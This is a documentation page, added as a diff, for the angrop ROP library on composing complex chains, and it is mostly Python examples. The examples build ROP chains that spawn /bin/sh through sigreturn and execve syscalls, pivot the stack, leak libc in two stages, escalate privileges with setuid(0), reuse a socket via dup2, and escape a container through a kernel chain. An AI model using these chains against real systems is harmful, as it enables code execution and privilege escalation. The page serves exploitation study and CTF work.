@@ -1,0 +1,518 @@
+---
+title: 'Complex Chain Composition'
+description: 'Advanced ROP chain techniques including register preservation, sigreturn, and multi-stage chains'
+---
+
+This guide covers advanced ROP chain composition techniques including register preservation, sigreturn frames, memory writes combined with function calls, and complex multi-stage exploits.
+
+## Register Preservation
+
+When building complex chains, you often need to set up multiple registers without clobbering values you've already set.
+
+### Basic Register Preservation
+
+```python
+import angr
+import angrop
+
+proj = angr.Project("/bin/bash")
+rop = proj.analyses.ROP()
+rop.find_gadgets()
+
+# Set rdi, then set rsi while preserving rdi
+chain = (
+    rop.set_regs(rdi=0x1337) +
+    rop.set_regs(rsi=0x4141, preserve_regs={'rdi'})
+)
+
+chain.pp()
+```
+
+### Preserving Multiple Registers
+
+```python
+# Set up three registers, preserving previous values
+chain = (
+    rop.set_regs(rdi=0xdeadbeef) +
+    rop.set_regs(rsi=0xcafebabe, preserve_regs={'rdi'}) +
+    rop.set_regs(rdx=0x1337, preserve_regs={'rdi', 'rsi'})
+)
+```
+
+### Function Calls with Register Preservation
+
+From the Python API docs and real examples:
+
+```python
+# Preserve rdi when calling a function
+chain = rop.func_call(
+    "prepare_kernel_cred",
+    (0x41414141, 0x42424242),
+    preserve_regs={'rdi'}
+)
+
+chain.pp()
+```
+
+Output:
+```
+0xffffffff81489752: pop rsi; ret 
+                    0x42424242
+0xffffffff8114d660: <prepare_kernel_cred>
+                    <BV64 next_pc_4280_64>
+```
+
+**Note:** When you specify `preserve_regs={'rdi'}`, angrop will:
+1. **Ignore** the first argument (`0x41414141`) since rdi is preserved
+2. Only set registers that are **not** in the preserve set
+3. Keep the existing value in rdi intact
+
+### Real-World Example: Kernel Chain
+
+From `examples/linux_escape_chain/solve.py:38-44`:
+
+```python
+chain = (
+    rop.func_call("commit_creds", [init_cred]) +
+    rop.func_call("find_task_by_vpid", [1]) +
+    rop.move_regs(rdi='rax') +
+    rop.set_regs(rsi=init_nsproxy, preserve_regs={'rdi'}) +
+    rop.func_call("switch_task_namespaces", [], preserve_regs={'rdi', 'rsi'}) +
+    rop.func_call('__x64_sys_fork', []) +
+    rop.func_call('msleep', [0xffffffff])
+)
+```
+
+**Why preserve_regs matters here:**
+- `move_regs(rdi='rax')` puts the task_struct pointer in rdi
+- `set_regs(rsi=init_nsproxy, preserve_regs={'rdi'})` sets rsi without destroying rdi
+- `func_call("switch_task_namespaces", [], preserve_regs={'rdi', 'rsi'})` keeps both arguments
+
+## Sigreturn (SROP) Chains
+
+Signal return frames let you set **all registers** at once, including RIP and RSP.
+
+### Basic Sigreturn
+
+```python
+import angr
+import angrop
+
+proj = angr.Project("/bin/target")
+rop = proj.analyses.ROP()
+rop.find_gadgets()
+
+# Set rip/rsp and registers via sigreturn frame
+chain = rop.sigreturn(
+    rip=0x401000,
+    rsp=0x7fffffffe000,
+    rax=59,  # __NR_execve
+    rdi=0x41414141
+)
+
+chain.pp()
+```
+
+### Sigreturn for Syscalls
+
+From `docs/pythonapi.md:61-62`:
+
+```python
+# Automatically set registers for a syscall
+chain = rop.sigreturn_syscall(
+    0x3b,  # syscall number (execve)
+    [next(elf.search(b"/bin/sh\x00")), 0, 0],  # args
+    sp=0x401234
+)
+```
+
+### When to Use Sigreturn
+
+**Use SROP when:**
+- You have very few gadgets available
+- You need to set many registers at once
+- You want to control both code and stack pointers
+- You have a `sigreturn` gadget (or syscall 15 on x86_64)
+
+**Typical pattern:**
+```python
+# 1. Write "/bin/sh" to known location
+# 2. Use sigreturn to:
+#    - Set rax = 59 (execve)
+#    - Set rdi = pointer to "/bin/sh"
+#    - Set rsi = 0, rdx = 0
+#    - Set rip = syscall gadget
+chain = (
+    rop.write_to_mem(0x61b100, b"/bin/sh\x00") +
+    rop.sigreturn(
+        rax=59,
+        rdi=0x61b100,
+        rsi=0,
+        rdx=0,
+        rip=syscall_gadget_addr,
+        rsp=0x7fffffffe000
+    )
+)
+```
+
+## Memory Write + Function Call Chains
+
+Complex exploits often require writing data to memory before calling functions.
+
+### Write String Then Call Function
+
+From `docs/pythonapi.md:45-46, 77`:
+
+```python
+import os
+import angr
+import angrop
+
+proj = angr.Project("/bin/target")
+rop = proj.analyses.ROP()
+rop.find_gadgets()
+
+# Write "/home/ctf/flag" then call open()
+chain = (
+    rop.write_to_mem(0x61b100, b"/home/ctf/flag\x00") +
+    rop.func_call("open", [0x61b100, os.O_RDONLY])
+)
+```
+
+### Complete File Read Chain
+
+```python
+import os
+
+buf_addr = 0x61b100
+flag_path_addr = buf_addr
+read_buf_addr = buf_addr + 0x100
+
+chain = (
+    # Write path string
+    rop.write_to_mem(flag_path_addr, b"/home/ctf/flag\x00") +
+    
+    # open("/home/ctf/flag", O_RDONLY)
+    rop.func_call("open", [flag_path_addr, os.O_RDONLY]) +
+    
+    # fd is now in rax, move to rdi for read()
+    rop.move_regs(rdi='rax') +
+    
+    # read(fd, read_buf_addr, 0x100)
+    rop.set_regs(rsi=read_buf_addr, rdx=0x100, preserve_regs={'rdi'}) +
+    rop.func_call("read", [], preserve_regs={'rdi', 'rsi', 'rdx'}) +
+    
+    # write(1, read_buf_addr, 0x100)  
+    rop.func_call("write", [1, read_buf_addr, 0x100])
+)
+
+chain.pp()
+```
+
+## Memory Manipulation Chains
+
+### Memory Arithmetic Operations
+
+From `docs/pythonapi.md:39-42`:
+
+```python
+# Add to memory
+chain = rop.mem_add(0x804f124, 0x41414141)
+
+# XOR memory
+chain = rop.mem_xor(0x804f124, 0x41414141)
+
+# OR memory
+chain = rop.mem_or(0x804f124, 0x41414141)
+
+# AND memory
+chain = rop.mem_and(0x804f124, 0x41414141)
+```
+
+### Practical Use: Bypassing Canary
+
+```python
+import angr
+import angrop
+
+proj = angr.Project("/bin/target")
+rop = proj.analyses.ROP()
+rop.find_gadgets()
+
+# Assume you leaked canary value
+leaked_canary = 0x1234567890abcdef
+canary_location = 0x7fffffffdf08
+
+# XOR the canary location with itself to zero it
+chain = (
+    rop.mem_xor(canary_location, leaked_canary) +
+    # Now canary is 0x0000000000000000
+    # Continue with exploit...
+    rop.func_call("system", [next(elf.search(b"/bin/sh"))])
+)
+```
+
+## Register Movement Patterns
+
+### Moving Return Values
+
+```python
+# Pattern: function returns in rax, next function needs it in rdi
+chain = (
+    rop.func_call("getuid", []) +
+    rop.move_regs(rdi='rax') +  # Move rax -> rdi
+    rop.func_call("setuid", [], preserve_regs={'rdi'})
+)
+```
+
+### Complex Register Shuffling
+
+```python
+# Swap register values
+chain = (
+    # Save rdi to rax
+    rop.move_regs(rax='rdi') +
+    # Move rsi to rdi
+    rop.move_regs(rdi='rsi') +
+    # Move saved rax to rsi
+    rop.move_regs(rsi='rax')
+)
+```
+
+## Stack Pivoting
+
+### Pivot to Controlled Region
+
+From `docs/pythonapi.md:49-50`:
+
+```python
+# Pivot stack to register value
+chain = rop.pivot('rax')
+
+# Or pivot to specific address
+chain = rop.pivot(0x41414140)
+```
+
+### Complete Pivot Example
+
+```python
+import angr
+import angrop
+
+proj = angr.Project("/bin/target")
+rop = proj.analyses.ROP()
+rop.find_gadgets()
+
+# Assume you control a buffer at 0x41414000
+controlled_buf = 0x41414000
+
+# Stage 1: Pivot to controlled buffer
+stage1 = rop.pivot(controlled_buf)
+
+# Stage 2: Build actual exploit chain
+stage2 = (
+    rop.write_to_mem(0x61b100, b"/bin/sh\x00") +
+    rop.func_call("system", [0x61b100])
+)
+
+# Place stage2 at the controlled buffer
+# Then use stage1 to pivot there
+payload = b"A" * offset + stage1.payload_str()
+payload += b"\x00" * (controlled_buf - len(payload))
+payload += stage2.payload_str()
+```
+
+## Syscall Chains
+
+### Direct Syscall Invocation
+
+From `docs/pythonapi.md:56`:
+
+```python
+# invoke syscall with arguments
+chain = rop.do_syscall(
+    0,  # syscall number (read)
+    [0, 0x41414141, 0x100],  # args: fd, buf, count
+    needs_return=False
+)
+```
+
+### execve() via Syscall
+
+```python
+import angr
+import angrop
+
+proj = angr.Project("/bin/target")
+rop = proj.analyses.ROP()
+rop.find_gadgets()
+
+# Method 1: Use built-in execve()
+chain = rop.execve()
+
+# Method 2: Manual syscall
+bin_sh_addr = 0x61b100
+chain = (
+    rop.write_to_mem(bin_sh_addr, b"/bin/sh\x00") +
+    rop.do_syscall(
+        59,  # __NR_execve
+        [bin_sh_addr, 0, 0],  # path, argv, envp
+        needs_return=False
+    )
+)
+```
+
+## Advanced Chain Techniques
+
+### Ret Sled
+
+From `docs/pythonapi.md:69-70`:
+
+```python
+# Generate ret-sled (works for ARM/MIPS too)
+chain = rop.retsled(0x40)
+```
+
+Use cases:
+- Align stack before calling functions
+- Delay execution for timing attacks
+- Pad chain to avoid detection
+
+### Stack Shifting
+
+From `docs/pythonapi.md:67`:
+
+```python
+# Shift stack pointer: add rsp, 0x8; ret
+# This gadget shifts rsp by 0x10 total (0x8 + 0x8 for ret)
+chain = rop.shift(0x10)
+```
+
+### Badbyte Avoidance
+
+From `docs/pythonapi.md:72-74`:
+
+```python
+# Set badbytes before building chains
+rop.set_badbytes([0x0, 0x0a, 0x0d])
+
+# All chains will avoid these bytes
+chain = rop.set_regs(eax=0)
+```
+
+## Multi-Stage Exploit Example
+
+```python
+import os
+import angr
+import angrop
+
+proj = angr.Project("/bin/target")
+rop = proj.analyses.ROP()
+rop.find_gadgets()
+
+# Stage 1: Leak libc
+stage1 = (
+    rop.func_call("puts", [elf.got['puts']]) +
+    rop.func_call("main", [])  # Return to main
+)
+
+# Stage 2: After leak, calculate addresses
+# (This happens at runtime in your exploit script)
+libc_base = leaked_puts - libc.symbols['puts']
+system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + next(libc.search(b"/bin/sh"))
+
+# Stage 2: Call system("/bin/sh")
+stage2 = rop.func_call(system_addr, [bin_sh_addr])
+
+# Build final payload
+payload1 = b"A" * offset + stage1.payload_str()
+# ... send payload1, receive leak ...
+payload2 = b"A" * offset + stage2.payload_str()
+# ... send payload2, get shell ...
+```
+
+## Debugging Complex Chains
+
+### Pretty Print with Comments
+
+```python
+chain = (
+    rop.write_to_mem(0x61b100, b"/bin/sh\x00") +
+    rop.func_call("system", [0x61b100])
+)
+
+# View the chain structure
+chain.pp()
+```
+
+### Generate Python Code
+
+From `docs/pythonapi.md:80-87`:
+
+```python
+chain.print_payload_code()
+```
+
+Output:
+```python
+chain = b""
+chain += p64(0x410b23)  # pop rax; ret
+chain += p64(0x74632f656d6f682f)
+chain += p64(0x404dc0)  # pop rbx; ret
+chain += p64(0x61b0f8)
+chain += p64(0x40ab63)  # mov qword ptr [rbx + 8], rax; add rsp, 0x10; pop rbx; ret
+...
+```
+
+### Validate Chain Length
+
+```python
+chain = rop.set_regs(rdi=0x1337, rsi=0x4141, rdx=0x100)
+
+print(f"Chain length: {len(chain.payload_str())} bytes")
+print(f"Number of gadgets: {len(chain._values)}")
+```
+
+## Common Patterns
+
+### Pattern: Open-Read-Write
+
+```python
+chain = (
+    rop.write_to_mem(buf, b"flag.txt\x00") +
+    rop.func_call("open", [buf, 0]) +
+    rop.move_regs(rdi='rax') +
+    rop.set_regs(rsi=buf+0x100, rdx=0x100, preserve_regs={'rdi'}) +
+    rop.func_call("read", [], preserve_regs={'rdi', 'rsi', 'rdx'}) +
+    rop.func_call("write", [1, buf+0x100, 0x100])
+)
+```
+
+### Pattern: Privilege Escalation
+
+```python
+chain = (
+    rop.func_call("setuid", [0]) +
+    rop.func_call("setgid", [0]) +
+    rop.func_call("system", [bin_sh_addr])
+)
+```
+
+### Pattern: Socket Reuse
+
+```python
+# Redirect stdin/stdout/stderr to socket fd 4
+chain = (
+    rop.func_call("dup2", [4, 0]) +
+    rop.func_call("dup2", [4, 1]) +
+    rop.func_call("dup2", [4, 2]) +
+    rop.func_call("execve", [bin_sh_addr, 0, 0])
+)
+```
+
+## Related Examples
+
+- [Kernel Escape Chain](/examples/kernel-escape) - Real-world kernel exploitation
+- [Custom Gadgets](/examples/custom-gadgets) - Working with specific addresses
